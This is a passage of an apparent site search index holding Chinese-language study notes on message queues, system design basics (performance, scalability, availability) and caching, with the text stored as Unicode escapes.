\u4F8B\u5982\u5728\u6CE8\u518C\u6D41\u7A0B\u4E2D\u901A\u5E38\u9700\u8981\u53D1\u9001\u9A8C\u8BC1\u90AE\u4EF6\u6765\u786E\u4FDD\u6CE8\u518C\u7528\u6237\u8EAB\u4EFD\u7684\u5408\u6CD5\u6027\uFF0C\u53EF\u4EE5\u4F7F\u7528\u6D88\u606F\u961F\u5217\u4F7F\u53D1\u9001\u9A8C\u8BC1\u90AE\u4EF6\u7684\u64CD\u4F5C\u5F02\u6B65\u5904\u7406\uFF0C\u7528\u6237\u5728\u586B\u5199\u5B8C\u6CE8\u518C\u4FE1\u606F\u4E4B\u540E\u5C31\u53EF\u4EE5\u5B8C\u6210\u6CE8\u518C\uFF0C\u800C\u5C06\u53D1\u9001\u9A8C\u8BC1\u90AE\u4EF6\u8FD9\u4E00\u6D88\u606F\u53D1\u9001\u5230\u6D88\u606F\u961F\u5217\u4E2D\u3002
\u53EA\u6709\u5728\u4E1A\u52A1\u6D41\u7A0B\u5141\u8BB8\u5F02\u6B65\u5904\u7406\u7684\u60C5\u51B5\u4E0B\u624D\u80FD\u8FD9\u4E48\u505A\uFF0C\u4F8B\u5982\u4E0A\u9762\u7684\u6CE8\u518C\u6D41\u7A0B\u4E2D\uFF0C\u5982\u679C\u8981\u6C42\u7528\u6237\u5BF9\u9A8C\u8BC1\u90AE\u4EF6\u8FDB\u884C\u70B9\u51FB\u4E4B\u540E\u624D\u80FD\u5B8C\u6210\u6CE8\u518C\u7684\u8BDD\uFF0C\u5C31\u4E0D\u80FD\u518D\u4F7F\u7528\u6D88\u606F\u961F\u5217\u3002`},{header:"\u6D41\u91CF\u524A\u950B",slug:"\u6D41\u91CF\u524A\u950B",content:`\u5728\u9AD8\u5E76\u53D1\u7684\u573A\u666F\u4E0B\uFF0C\u5982\u679C\u77ED\u65F6\u95F4\u6709\u5927\u91CF\u7684\u8BF7\u6C42\u5230\u8FBE\u4F1A\u538B\u57AE\u670D\u52A1\u5668\u3002
\u53EF\u4EE5\u5C06\u8BF7\u6C42\u53D1\u9001\u5230\u6D88\u606F\u961F\u5217\u4E2D\uFF0C\u670D\u52A1\u5668\u6309\u7167\u5176\u5904\u7406\u80FD\u529B\u4ECE\u6D88\u606F\u961F\u5217\u4E2D\u8BA2\u9605\u6D88\u606F\u8FDB\u884C\u5904\u7406\u3002`},{header:"\u5E94\u7528\u89E3\u8026",slug:"\u5E94\u7528\u89E3\u8026",content:`\u5982\u679C\u6A21\u5757\u4E4B\u95F4\u4E0D\u76F4\u63A5\u8FDB\u884C\u8C03\u7528\uFF0C\u6A21\u5757\u4E4B\u95F4\u8026\u5408\u5EA6\u5C31\u4F1A\u5F88\u4F4E\uFF0C\u90A3\u4E48\u4FEE\u6539\u4E00\u4E2A\u6A21\u5757\u6216\u8005\u65B0\u589E\u4E00\u4E2A\u6A21\u5757\u5BF9\u5176\u5B83\u6A21\u5757\u7684\u5F71\u54CD\u4F1A\u5F88\u5C0F\uFF0C\u4ECE\u800C\u5B9E\u73B0\u53EF\u6269\u5C55\u6027\u3002
\u901A\u8FC7\u4F7F\u7528\u6D88\u606F\u961F\u5217\uFF0C\u4E00\u4E2A\u6A21\u5757\u53EA\u9700\u8981\u5411\u6D88\u606F\u961F\u5217\u4E2D\u53D1\u9001\u6D88\u606F\uFF0C\u5176\u5B83\u6A21\u5757\u53EF\u4EE5\u9009\u62E9\u6027\u5730\u4ECE\u6D88\u606F\u961F\u5217\u4E2D\u8BA2\u9605\u6D88\u606F\u4ECE\u800C\u5B8C\u6210\u8C03\u7528\u3002`},{header:"\u4E09\u3001\u53EF\u9760\u6027",slug:"\u4E09\u3001\u53EF\u9760\u6027",content:""},{header:"\u53D1\u9001\u7AEF\u7684\u53EF\u9760\u6027",slug:"\u53D1\u9001\u7AEF\u7684\u53EF\u9760\u6027",content:`\u53D1\u9001\u7AEF\u5B8C\u6210\u64CD\u4F5C\u540E\u4E00\u5B9A\u80FD\u5C06\u6D88\u606F\u6210\u529F\u53D1\u9001\u5230\u6D88\u606F\u961F\u5217\u4E2D\u3002
\u5B9E\u73B0\u65B9\u6CD5\uFF1A\u5728\u672C\u5730\u6570\u636E\u5E93\u5EFA\u4E00\u5F20\u6D88\u606F\u8868\uFF0C\u5C06\u6D88\u606F\u6570\u636E\u4E0E\u4E1A\u52A1\u6570\u636E\u4FDD\u5B58\u5728\u540C\u4E00\u6570\u636E\u5E93\u5B9E\u4F8B\u91CC\uFF0C\u8FD9\u6837\u5C31\u53EF\u4EE5\u5229\u7528\u672C\u5730\u6570\u636E\u5E93\u7684\u4E8B\u52A1\u673A\u5236\u3002\u4E8B\u52A1\u63D0\u4EA4\u6210\u529F\u540E\uFF0C\u5C06\u6D88\u606F\u8868\u4E2D\u7684\u6D88\u606F\u8F6C\u79FB\u5230\u6D88\u606F\u961F\u5217\u4E2D\uFF0C\u82E5\u8F6C\u79FB\u6D88\u606F\u6210\u529F\u5219\u5220\u9664\u6D88\u606F\u8868\u4E2D\u7684\u6570\u636E\uFF0C\u5426\u5219\u7EE7\u7EED\u91CD\u4F20\u3002`},{header:"\u63A5\u6536\u7AEF\u7684\u53EF\u9760\u6027",slug:"\u63A5\u6536\u7AEF\u7684\u53EF\u9760\u6027",content:`\u63A5\u6536\u7AEF\u80FD\u591F\u4ECE\u6D88\u606F\u961F\u5217\u6210\u529F\u6D88\u8D39\u4E00\u6B21\u6D88\u606F\u3002
\u4E24\u79CD\u5B9E\u73B0\u65B9\u6CD5\uFF1A \u4FDD\u8BC1\u63A5\u6536\u7AEF\u5904\u7406\u6D88\u606F\u7684\u4E1A\u52A1\u903B\u8F91\u5177\u6709\u5E42\u7B49\u6027\uFF1A\u53EA\u8981\u5177\u6709\u5E42\u7B49\u6027\uFF0C\u90A3\u4E48\u6D88\u8D39\u591A\u5C11\u6B21\u6D88\u606F\uFF0C\u6700\u540E\u5904\u7406\u7684\u7ED3\u679C\u90FD\u662F\u4E00\u6837\u7684\u3002
\u4FDD\u8BC1\u6D88\u606F\u5177\u6709\u552F\u4E00\u7F16\u53F7\uFF0C\u5E76\u4F7F\u7528\u4E00\u5F20\u65E5\u5FD7\u8868\u6765\u8BB0\u5F55\u5DF2\u7ECF\u6D88\u8D39\u7684\u6D88\u606F\u7F16\u53F7\u3002`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`Observer vs Pub-Sub
\u6D88\u606F\u961F\u5217\u4E2D\u70B9\u5BF9\u70B9\u4E0E\u53D1\u5E03\u8BA2\u9605\u533A\u522B`}]},{path:"/java/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.html",title:"\u7CFB\u7EDF\u8BBE\u8BA1\u57FA\u7840",pathLocale:"/",contents:[{header:"\u7CFB\u7EDF\u8BBE\u8BA1\u57FA\u7840",slug:"\u7CFB\u7EDF\u8BBE\u8BA1\u57FA\u7840",content:`\u7CFB\u7EDF\u8BBE\u8BA1\u57FA\u7840 \u4E00\u3001\u6027\u80FD
\u4E8C\u3001\u4F38\u7F29\u6027
\u4E09\u3001\u6269\u5C55\u6027
\u56DB\u3001\u53EF\u7528\u6027
\u4E94\u3001\u5B89\u5168\u6027
\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u6027\u80FD",slug:"\u4E00\u3001\u6027\u80FD",content:""},{header:"\u6027\u80FD\u6307\u6807",slug:"\u6027\u80FD\u6307\u6807",content:""},{header:"1. \u54CD\u5E94\u65F6\u95F4",slug:"_1-\u54CD\u5E94\u65F6\u95F4",content:`\u6307\u67D0\u4E2A\u8BF7\u6C42\u4ECE\u53D1\u51FA\u5230\u63A5\u6536\u5230\u54CD\u5E94\u6D88\u8017\u7684\u65F6\u95F4\u3002
\u5728\u5BF9\u54CD\u5E94\u65F6\u95F4\u8FDB\u884C\u6D4B\u8BD5\u65F6\uFF0C\u901A\u5E38\u91C7\u7528\u91CD\u590D\u8BF7\u6C42\u7684\u65B9\u5F0F\uFF0C\u7136\u540E\u8BA1\u7B97\u5E73\u5747\u54CD\u5E94\u65F6\u95F4\u3002`},{header:"2. \u541E\u5410\u91CF",slug:"_2-\u541E\u5410\u91CF",content:"\u6307\u7CFB\u7EDF\u5728\u5355\u4F4D\u65F6\u95F4\u5185\u53EF\u4EE5\u5904\u7406\u7684\u8BF7\u6C42\u6570\u91CF\uFF0C\u901A\u5E38\u4F7F\u7528\u6BCF\u79D2\u7684\u8BF7\u6C42\u6570\u6765\u8861\u91CF\u3002"},{header:"3. \u5E76\u53D1\u7528\u6237\u6570",slug:"_3-\u5E76\u53D1\u7528\u6237\u6570",content:`\u6307\u7CFB\u7EDF\u80FD\u540C\u65F6\u5904\u7406\u7684\u5E76\u53D1\u7528\u6237\u8BF7\u6C42\u6570\u91CF\u3002
\u5728\u6CA1\u6709\u5E76\u53D1\u5B58\u5728\u7684\u7CFB\u7EDF\u4E2D\uFF0C\u8BF7\u6C42\u88AB\u987A\u5E8F\u6267\u884C\uFF0C\u6B64\u65F6\u54CD\u5E94\u65F6\u95F4\u4E3A\u541E\u5410\u91CF\u7684\u5012\u6570\u3002\u4F8B\u5982\u7CFB\u7EDF\u652F\u6301\u7684\u541E\u5410\u91CF\u4E3A 100 req/s\uFF0C\u90A3\u4E48\u5E73\u5747\u54CD\u5E94\u65F6\u95F4\u5E94\u8BE5\u4E3A 0.01s\u3002
\u76EE\u524D\u7684\u5927\u578B\u7CFB\u7EDF\u90FD\u652F\u6301\u591A\u7EBF\u7A0B\u6765\u5904\u7406\u5E76\u53D1\u8BF7\u6C42\uFF0C\u591A\u7EBF\u7A0B\u80FD\u591F\u63D0\u9AD8\u541E\u5410\u91CF\u4EE5\u53CA\u7F29\u77ED\u54CD\u5E94\u65F6\u95F4\uFF0C\u4E3B\u8981\u6709\u4E24\u4E2A\u539F\u56E0\uFF1A \u591A CPU
IO \u7B49\u5F85\u65F6\u95F4 \u4F7F\u7528 IO \u591A\u8DEF\u590D\u7528\u7B49\u65B9\u5F0F\uFF0C\u7CFB\u7EDF\u5728\u7B49\u5F85\u4E00\u4E2A IO \u64CD\u4F5C\u5B8C\u6210\u7684\u8FD9\u6BB5\u65F6\u95F4\u5185\u4E0D\u9700\u8981\u88AB\u963B\u585E\uFF0C\u53EF\u4EE5\u53BB\u5904\u7406\u5176\u5B83\u8BF7\u6C42\u3002\u901A\u8FC7\u5C06\u8FD9\u4E2A\u7B49\u5F85\u65F6\u95F4\u5229\u7528\u8D77\u6765\uFF0C\u4F7F\u5F97 CPU \u5229\u7528\u7387\u5927\u5927\u63D0\u9AD8\u3002
\u5E76\u53D1\u7528\u6237\u6570\u4E0D\u662F\u8D8A\u9AD8\u8D8A\u597D\uFF0C\u56E0\u4E3A\u5982\u679C\u5E76\u53D1\u7528\u6237\u6570\u592A\u9AD8\uFF0C\u7CFB\u7EDF\u6765\u4E0D\u53CA\u5904\u7406\u8FD9\u4E48\u591A\u7684\u8BF7\u6C42\uFF0C\u4F1A\u4F7F\u5F97\u8FC7\u591A\u7684\u8BF7\u6C42\u9700\u8981\u7B49\u5F85\uFF0C\u90A3\u4E48\u54CD\u5E94\u65F6\u95F4\u5C31\u4F1A\u5927\u5927\u63D0\u9AD8\u3002`},{header:"\u6027\u80FD\u4F18\u5316",slug:"\u6027\u80FD\u4F18\u5316",content:""},{header:"1. \u96C6\u7FA4",slug:"_1-\u96C6\u7FA4",content:"\u5C06\u591A\u53F0\u670D\u52A1\u5668\u7EC4\u6210\u96C6\u7FA4\uFF0C\u4F7F\u7528\u8D1F\u8F7D\u5747\u8861\u5C06\u8BF7\u6C42\u8F6C\u53D1\u5230\u96C6\u7FA4\u4E2D\uFF0C\u907F\u514D\u5355\u4E00\u670D\u52A1\u5668\u7684\u8D1F\u8F7D\u538B\u529B\u8FC7\u5927\u5BFC\u81F4\u6027\u80FD\u964D\u4F4E\u3002"},{header:"2. \u7F13\u5B58",slug:"_2-\u7F13\u5B58",content:`\u7F13\u5B58\u80FD\u591F\u63D0\u9AD8\u6027\u80FD\u7684\u539F\u56E0\u5982\u4E0B\uFF1A \u7F13\u5B58\u6570\u636E\u901A\u5E38\u4F4D\u4E8E\u5185\u5B58\u7B49\u4ECB\u8D28\u4E2D\uFF0C\u8FD9\u79CD\u4ECB\u8D28\u5BF9\u4E8E\u8BFB\u64CD\u4F5C\u7279\u522B\u5FEB\uFF1B
\u7F13\u5B58\u6570\u636E\u53EF\u4EE5\u4F4D\u4E8E\u9760\u8FD1\u7528\u6237\u7684\u5730\u7406\u4F4D\u7F6E\u4E0A\uFF1B
\u53EF\u4EE5\u5C06\u8BA1\u7B97\u7ED3\u679C\u8FDB\u884C\u7F13\u5B58\uFF0C\u4ECE\u800C\u907F\u514D\u91CD\u590D\u8BA1\u7B97\u3002`},{header:"3. \u5F02\u6B65",slug:"_3-\u5F02\u6B65",content:"\u67D0\u4E9B\u6D41\u7A0B\u53EF\u4EE5\u5C06\u64CD\u4F5C\u8F6C\u6362\u4E3A\u6D88\u606F\uFF0C\u5C06\u6D88\u606F\u53D1\u9001\u5230\u6D88\u606F\u961F\u5217\u4E4B\u540E\u7ACB\u5373\u8FD4\u56DE\uFF0C\u4E4B\u540E\u8FD9\u4E2A\u64CD\u4F5C\u4F1A\u88AB\u5F02\u6B65\u5904\u7406\u3002"},{header:"\u4E8C\u3001\u4F38\u7F29\u6027",slug:"\u4E8C\u3001\u4F38\u7F29\u6027",content:"\u6307\u4E0D\u65AD\u5411\u96C6\u7FA4\u4E2D\u6DFB\u52A0\u670D\u52A1\u5668\u6765\u7F13\u89E3\u4E0D\u65AD\u4E0A\u5347\u7684\u7528\u6237\u5E76\u53D1\u8BBF\u95EE\u538B\u529B\u548C\u4E0D\u65AD\u589E\u957F\u7684\u6570\u636E\u5B58\u50A8\u9700\u6C42\u3002"},{header:"\u4F38\u7F29\u6027\u4E0E\u6027\u80FD",slug:"\u4F38\u7F29\u6027\u4E0E\u6027\u80FD",content:`\u5982\u679C\u7CFB\u7EDF\u5B58\u5728\u6027\u80FD\u95EE\u9898\uFF0C\u90A3\u4E48\u5355\u4E2A\u7528\u6237\u7684\u8BF7\u6C42\u603B\u662F\u5F88\u6162\u7684\uFF1B
\u5982\u679C\u7CFB\u7EDF\u5B58\u5728\u4F38\u7F29\u6027\u95EE\u9898\uFF0C\u90A3\u4E48\u5355\u4E2A\u7528\u6237\u7684\u8BF7\u6C42\u53EF\u80FD\u4F1A\u5F88\u5FEB\uFF0C\u4F46\u662F\u5728\u5E76\u53D1\u6570\u5F88\u9AD8\u7684\u60C5\u51B5\u4E0B\u7CFB\u7EDF\u4F1A\u5F88\u6162\u3002`},{header:"\u5B9E\u73B0\u4F38\u7F29\u6027",slug:"\u5B9E\u73B0\u4F38\u7F29\u6027",content:`\u5E94\u7528\u670D\u52A1\u5668\u53EA\u8981\u4E0D\u5177\u6709\u72B6\u6001\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u5F88\u5BB9\u6613\u5730\u901A\u8FC7\u8D1F\u8F7D\u5747\u8861\u5668\u5411\u96C6\u7FA4\u4E2D\u6DFB\u52A0\u65B0\u7684\u670D\u52A1\u5668\u3002
\u5173\u7CFB\u578B\u6570\u636E\u5E93\u7684\u4F38\u7F29\u6027\u901A\u8FC7 Sharding \u6765\u5B9E\u73B0\uFF0C\u5C06\u6570\u636E\u6309\u4E00\u5B9A\u7684\u89C4\u5219\u5206\u5E03\u5230\u4E0D\u540C\u7684\u8282\u70B9\u4E0A\uFF0C\u4ECE\u800C\u89E3\u51B3\u5355\u53F0\u5B58\u50A8\u670D\u52A1\u5668\u7684\u5B58\u50A8\u7A7A\u95F4\u9650\u5236\u3002
\u5BF9\u4E8E\u975E\u5173\u7CFB\u578B\u6570\u636E\u5E93\uFF0C\u5B83\u4EEC\u5929\u751F\u5C31\u662F\u4E3A\u6D77\u91CF\u6570\u636E\u800C\u8BDE\u751F\uFF0C\u5BF9\u4F38\u7F29\u6027\u7684\u652F\u6301\u7279\u522B\u597D\u3002`},{header:"\u4E09\u3001\u6269\u5C55\u6027",slug:"\u4E09\u3001\u6269\u5C55\u6027",content:`\u6307\u7684\u662F\u6DFB\u52A0\u65B0\u529F\u80FD\u65F6\u5BF9\u73B0\u6709\u7CFB\u7EDF\u7684\u5176\u5B83\u5E94\u7528\u65E0\u5F71\u54CD\uFF0C\u8FD9\u5C31\u8981\u6C42\u4E0D\u540C\u5E94\u7528\u5177\u5907\u4F4E\u8026\u5408\u7684\u7279\u70B9\u3002
\u5B9E\u73B0\u53EF\u6269\u5C55\u4E3B\u8981\u6709\u4E24\u79CD\u65B9\u5F0F\uFF1A \u4F7F\u7528\u6D88\u606F\u961F\u5217\u8FDB\u884C\u89E3\u8026\uFF0C\u5E94\u7528\u4E4B\u95F4\u901A\u8FC7\u6D88\u606F\u4F20\u9012\u8FDB\u884C\u901A\u4FE1\uFF1B
\u4F7F\u7528\u5206\u5E03\u5F0F\u670D\u52A1\u5C06\u4E1A\u52A1\u548C\u53EF\u590D\u7528\u7684\u670D\u52A1\u5206\u79BB\u5F00\u6765\uFF0C\u4E1A\u52A1\u4F7F\u7528\u5206\u5E03\u5F0F\u670D\u52A1\u6846\u67B6\u8C03\u7528\u53EF\u590D\u7528\u7684\u670D\u52A1\u3002\u65B0\u589E\u7684\u4EA7\u54C1\u53EF\u4EE5\u901A\u8FC7\u8C03\u7528\u53EF\u590D\u7528\u7684\u670D\u52A1\u6765\u5B9E\u73B0\u4E1A\u52A1\u903B\u8F91\uFF0C\u5BF9\u5176\u5B83\u4EA7\u54C1\u6CA1\u6709\u5F71\u54CD\u3002`},{header:"\u56DB\u3001\u53EF\u7528\u6027",slug:"\u56DB\u3001\u53EF\u7528\u6027",content:""},{header:"\u5197\u4F59",slug:"\u5197\u4F59",content:`\u4FDD\u8BC1\u9AD8\u53EF\u7528\u7684\u4E3B\u8981\u624B\u6BB5\u662F\u4F7F\u7528\u5197\u4F59\uFF0C\u5F53\u67D0\u4E2A\u670D\u52A1\u5668\u6545\u969C\u65F6\u5C31\u8BF7\u6C42\u5176\u5B83\u670D\u52A1\u5668\u3002
\u5E94\u7528\u670D\u52A1\u5668\u7684\u5197\u4F59\u6BD4\u8F83\u5BB9\u6613\u5B9E\u73B0\uFF0C\u53EA\u8981\u4FDD\u8BC1\u5E94\u7528\u670D\u52A1\u5668\u4E0D\u5177\u6709\u72B6\u6001\uFF0C\u90A3\u4E48\u67D0\u4E2A\u5E94\u7528\u670D\u52A1\u5668\u6545\u969C\u65F6\uFF0C\u8D1F\u8F7D\u5747\u8861\u5668\u5C06\u8BE5\u5E94\u7528\u670D\u52A1\u5668\u539F\u5148\u7684\u7528\u6237\u8BF7\u6C42\u8F6C\u53D1\u5230\u53E6\u4E00\u4E2A\u5E94\u7528\u670D\u52A1\u5668\u4E0A\uFF0C\u4E0D\u4F1A\u5BF9\u7528\u6237\u6709\u4EFB\u4F55\u5F71\u54CD\u3002
\u5B58\u50A8\u670D\u52A1\u5668\u7684\u5197\u4F59\u9700\u8981\u4F7F\u7528\u4E3B\u4ECE\u590D\u5236\u6765\u5B9E\u73B0\uFF0C\u5F53\u4E3B\u670D\u52A1\u5668\u6545\u969C\u65F6\uFF0C\u9700\u8981\u63D0\u5347\u4ECE\u670D\u52A1\u5668\u4E3A\u4E3B\u670D\u52A1\u5668\uFF0C\u8FD9\u4E2A\u8FC7\u7A0B\u79F0\u4E3A\u5207\u6362\u3002`},{header:"\u76D1\u63A7",slug:"\u76D1\u63A7",content:"\u5BF9 CPU\u3001\u5185\u5B58\u3001\u78C1\u76D8\u3001\u7F51\u7EDC\u7B49\u7CFB\u7EDF\u8D1F\u8F7D\u4FE1\u606F\u8FDB\u884C\u76D1\u63A7\uFF0C\u5F53\u67D0\u4E2A\u4FE1\u606F\u8FBE\u5230\u4E00\u5B9A\u9608\u503C\u65F6\u901A\u77E5\u8FD0\u7EF4\u4EBA\u5458\uFF0C\u4ECE\u800C\u5728\u7CFB\u7EDF\u53D1\u751F\u6545\u969C\u4E4B\u524D\u53CA\u65F6\u53D1\u73B0\u95EE\u9898\u3002"},{header:"\u670D\u52A1\u964D\u7EA7",slug:"\u670D\u52A1\u964D\u7EA7",content:"\u670D\u52A1\u964D\u7EA7\u662F\u7CFB\u7EDF\u4E3A\u4E86\u5E94\u5BF9\u5927\u91CF\u7684\u8BF7\u6C42\uFF0C\u4E3B\u52A8\u5173\u95ED\u90E8\u5206\u529F\u80FD\uFF0C\u4ECE\u800C\u4FDD\u8BC1\u6838\u5FC3\u529F\u80FD\u53EF\u7528\u3002"},{header:"\u4E94\u3001\u5B89\u5168\u6027",slug:"\u4E94\u3001\u5B89\u5168\u6027",content:"\u8981\u6C42\u7CFB\u7EDF\u5728\u5E94\u5BF9\u5404\u79CD\u653B\u51FB\u624B\u6BB5\u65F6\u80FD\u591F\u6709\u53EF\u9760\u7684\u5E94\u5BF9\u63AA\u65BD\u3002"},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:"\u5927\u578B\u7F51\u7AD9\u6280\u672F\u67B6\u6784\uFF1A\u6838\u5FC3\u539F\u7406\u4E0E\u6848\u4F8B\u5206\u6790"}]},{path:"/java/%E7%BC%93%E5%AD%98.html",title:"\u7F13\u5B58",pathLocale:"/",contents:[{header:"\u7F13\u5B58",slug:"\u7F13\u5B58",content:`\u7F13\u5B58 \u4E00\u3001\u7F13\u5B58\u7279\u5F81
\u4E8C\u3001\u7F13\u5B58\u4F4D\u7F6E
\u4E09\u3001CDN
\u56DB\u3001\u7F13\u5B58\u95EE\u9898
\u4E94\u3001\u6570\u636E\u5206\u5E03
\u516D\u3001\u4E00\u81F4\u6027\u54C8\u5E0C
\u4E03\u3001LRU
\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u7F13\u5B58\u7279\u5F81",slug:"\u4E00\u3001\u7F13\u5B58\u7279\u5F81",content:""},{header:"\u547D\u4E2D\u7387",slug:"\u547D\u4E2D\u7387",content:`\u5F53\u67D0\u4E2A\u8BF7\u6C42\u80FD\u591F\u901A\u8FC7\u8BBF\u95EE\u7F13\u5B58\u800C\u5F97\u5230\u54CD\u5E94\u65F6\uFF0C\u79F0\u4E3A\u7F13\u5B58\u547D\u4E2D\u3002
\u7F13\u5B58\u547D\u4E2D\u7387\u8D8A\u9AD8\uFF0C\u7F13\u5B58\u7684\u5229\u7528\u7387\u4E5F\u5C31\u8D8A\u9AD8\u3002`},{header:"\u6700\u5927\u7A7A\u95F4",slug:"\u6700\u5927\u7A7A\u95F4",content:`\u7F13\u5B58\u901A\u5E38\u4F4D\u4E8E\u5185\u5B58\u4E2D\uFF0C\u5185\u5B58\u7684\u7A7A\u95F4\u901A\u5E38\u6BD4\u78C1\u76D8\u7A7A\u95F4\u5C0F\u7684\u591A\uFF0C\u56E0\u6B64\u7F13\u5B58\u7684\u6700\u5927\u7A7A\u95F4\u4E0D\u53EF\u80FD\u975E\u5E38\u5927\u3002
\u5F53\u7F13\u5B58\u5B58\u653E\u7684\u6570\u636E\u91CF\u8D85\u8FC7\u6700\u5927\u7A7A\u95F4\u65F6\uFF0C\u5C31\u9700\u8981\u6DD8\u6C70\u90E8\u5206\u6570\u636E\u6765\u5B58\u653E\u65B0\u5230\u8FBE\u7684\u6570\u636E\u3002`},{header:"\u6DD8\u6C70\u7B56\u7565",slug:"\u6DD8\u6C70\u7B56\u7565",content:"FIFO\uFF08First In First Out\uFF09\uFF1A\u5148\u8FDB\u5148\u51FA\u7B56\u7565\uFF0C\u5728\u5B9E\u65F6\u6027\u7684\u573A\u666F\u4E0B\uFF0C\u9700\u8981\u7ECF\u5E38\u8BBF\u95EE\u6700\u65B0\u7684\u6570\u636E\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u4F7F\u7528 FIFO\uFF0C\u4F7F\u5F97\u6700\u5148\u8FDB\u5165\u7684\u6570\u636E\uFF08\u6700\u665A\u7684\u6570\u636E\uFF09\u88AB\u6DD8\u6C70\u3002 LRU\uFF08Least Recently Used\uFF09\uFF1A\u6700\u8FD1\u6700\u4E45\u672A\u4F7F\u7528\u7B56\u7565\uFF0C\u4F18\u5148\u6DD8\u6C70\u6700\u4E45\u672A\u4F7F\u7528\u7684\u6570\u636E\uFF0C\u4E5F\u5C31\u662F\u4E0A\u6B21\u88AB\u8BBF\u95EE\u65F6\u95F4\u8DDD\u79BB\u73B0\u5728\u6700\u4E45\u7684\u6570\u636E\u3002\u8BE5\u7B56\u7565\u53EF\u4EE5\u4FDD\u8BC1\u5185\u5B58\u4E2D\u7684\u6570\u636E\u90FD\u662F\u70ED\u70B9\u6570\u636E\uFF0C\u4E5F\u5C31\u662F\u7ECF\u5E38\u88AB\u8BBF\u95EE\u7684\u6570\u636E\uFF0C\u4ECE\u800C\u4FDD\u8BC1\u7F13\u5B58\u547D\u4E2D\u7387\u3002 LFU\uFF08Least Frequently Used\uFF09\uFF1A\u6700\u4E0D\u7ECF\u5E38\u4F7F\u7528\u7B56\u7565\uFF0C\u4F18\u5148\u6DD8\u6C70\u4E00\u6BB5\u65F6\u95F4\u5185\u4F7F\u7528\u6B21\u6570\u6700\u5C11\u7684\u6570\u636E\u3002"},{header:"\u4E8C\u3001\u7F13\u5B58\u4F4D\u7F6E",slug:"\u4E8C\u3001\u7F13\u5B58\u4F4D\u7F6E",content:""},{header:"\u6D4F\u89C8\u5668",slug:"\u6D4F\u89C8\u5668",content:"\u5F53 HTTP \u54CD\u5E94\u5141\u8BB8\u8FDB\u884C\u7F13\u5B58\u65F6\uFF0C\u6D4F\u89C8\u5668\u4F1A\u5C06 HTML\u3001CSS\u3001JavaScript\u3001\u56FE\u7247\u7B49\u9759\u6001\u8D44\u6E90\u8FDB\u884C\u7F13\u5B58\u3002"},{header:"ISP",slug:"isp",content:"\u7F51\u7EDC\u670D\u52A1\u63D0\u4F9B\u5546\uFF08ISP\uFF09\u662F\u7F51\u7EDC\u8BBF\u95EE\u7684\u7B2C\u4E00\u8DF3\uFF0C\u901A\u8FC7\u5C06\u6570\u636E\u7F13\u5B58\u5728 ISP \u4E2D\u80FD\u591F\u5927\u5927\u63D0\u9AD8\u7528\u6237\u7684\u8BBF\u95EE\u901F\u5EA6\u3002"},{header:"\u53CD\u5411\u4EE3\u7406",slug:"\u53CD\u5411\u4EE3\u7406",content:"\u53CD\u5411\u4EE3\u7406\u4F4D\u4E8E\u670D\u52A1\u5668\u4E4B\u524D\uFF0C\u8BF7\u6C42\u4E0E\u54CD\u5E94\u90FD\u9700\u8981\u7ECF\u8FC7\u53CD\u5411\u4EE3\u7406\u3002\u901A\u8FC7\u5C06\u6570\u636E\u7F13\u5B58\u5728\u53CD\u5411\u4EE3\u7406\uFF0C\u5728\u7528\u6237\u8BF7\u6C42\u53CD\u5411\u4EE3\u7406\u65F6\u5C31\u53EF\u4EE5\u76F4\u63A5\u4F7F\u7528\u7F13\u5B58\u8FDB\u884C\u54CD\u5E94\u3002"},{header:"\u672C\u5730\u7F13\u5B58",slug:"\u672C\u5730\u7F13\u5B58",content:"\u4F7F\u7528 Guava Cache \u5C06\u6570\u636E\u7F13\u5B58\u5728\u670D\u52A1\u5668\u672C\u5730\u5185\u5B58\u4E2D\uFF0C\u670D\u52A1\u5668\u4EE3\u7801\u53EF\u4EE5\u76F4\u63A5\u8BFB\u53D6\u672C\u5730\u5185\u5B58\u4E2D\u7684\u7F13\u5B58\uFF0C\u901F\u5EA6\u975E\u5E38\u5FEB\u3002"},{header:"\u5206\u5E03\u5F0F\u7F13\u5B58",slug:"\u5206\u5E03\u5F0F\u7F13\u5B58",content:`\u4F7F\u7528 Redis\u3001Memcache \u7B49\u5206\u5E03\u5F0F\u7F13\u5B58\u5C06\u6570\u636E\u7F13\u5B58\u5728\u5206\u5E03\u5F0F\u7F13\u5B58\u7CFB\u7EDF\u4E2D\u3002
\u76F8\u5BF9\u4E8E\u672C\u5730\u7F13\u5B58\u6765\u8BF4\uFF0C\u5206\u5E03\u5F0F\u7F13\u5B58\u5355\u72EC\u90E8\u7F72\uFF0C\u53EF\u4EE5\u6839\u636E\u9700\u6C42\u5206\u914D\u786C\u4EF6\u8D44\u6E90\u3002\u4E0D\u4EC5\u5982\u6B64\uFF0C\u670D\u52A1\u5668\u96C6\u7FA4\u90FD\u53EF\u4EE5\u8BBF\u95EE\u5206\u5E03\u5F0F\u7F13\u5B58\uFF0C\u800C\u672C\u5730\u7F13\u5B58\u9700\u8981\u5728\u670D\u52A1\u5668\u96C6\u7FA4\u4E4B\u95F4\u8FDB\u884C\u540C\u6B65\uFF0C\u5B9E\u73B0\u96BE\u5EA6\u548C\u6027\u80FD\u5F00\u9500\u4E0A\u90FD\u975E\u5E38\u5927\u3002`},{header:"\u6570\u636E\u5E93\u7F13\u5B58",slug:"\u6570\u636E\u5E93\u7F13\u5B58",content:"MySQL \u7B49\u6570\u636E\u5E93\u7BA1\u7406\u7CFB\u7EDF\u5177\u6709\u81EA\u5DF1\u7684\u67E5\u8BE2\u7F13\u5B58\u673A\u5236\u6765\u63D0\u9AD8\u67E5\u8BE2\u6548\u7387\u3002"},{header:"Java \u5185\u90E8\u7684\u7F13\u5B58",slug:"java-\u5185\u90E8\u7684\u7F13\u5B58",content:"Java \u4E3A\u4E86\u4F18\u5316\u7A7A\u95F4\uFF0C\u63D0\u9AD8\u5B57\u7B26\u4E32\u3001\u57FA\u672C\u6570\u636E\u7C7B\u578B\u5305\u88C5\u7C7B\u7684\u521B\u5EFA\u6548\u7387\uFF0C\u8BBE\u8BA1\u4E86\u5B57\u7B26\u4E32\u5E38\u91CF\u6C60\u53CA 